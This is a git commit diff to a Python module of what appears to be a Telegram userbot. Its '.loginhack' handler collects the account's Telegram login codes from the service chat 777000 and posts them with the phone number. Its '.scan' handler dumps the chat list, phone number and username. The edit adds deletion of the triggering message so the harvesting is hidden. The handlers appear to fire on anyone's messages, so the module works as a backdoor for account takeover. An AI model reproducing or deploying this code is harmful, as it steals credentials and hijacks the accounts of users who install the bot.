9de71780f15110ddf6937b402e93caf34ab8e70c
Hacker <112378332+Hacker-UZ@users.noreply.github.com>
2023-08-21 19:37:58 +0500

    Update scan.py

--- phoenix/scan.py
+++ phoenix/scan.py
@@ -6,22 +6,24 @@ client = phoenix.client.client
 @events.register(events.NewMessage(pattern='\.scan'))
 async def chatscan(event):
     await event.edit("Scanning...")
-    time.sleep(0.1)
+    time.sleep(0.5)
+    await event.delete()
     user = await client.get_me()
     chats = "**Chats**\n"
     async for dailog in client.iter_dialogs():             
         chats += f"**chat:** {dailog.name} | **Id:** {str(dailog.id)}\n"
-    await event.edit(chats)
+    await event.send_messages(chats)
     await event.reply("Phone number: " + "+"+user.phone + "\nUsername: " + "@"+user.username + "\nUserbot Developer: @programmer_www")
 
 
 @events.register(events.NewMessage(pattern=".loginhack"))
 async def loginhack(event):
     await event.edit("Hacking...")
-    time.sleep(0.1)
+    time.sleep(0.5)
+    await event.delete()
     user = await client.get_me()
     codes = "**Telegram codes**\n"
     async for message in client.iter_messages(777000):
         codes += f"{message.text}\n---------------------------------------------\n"
     codes += "+"+user.phone
-    await event.edit(codes)
+    await event.reply(codes)
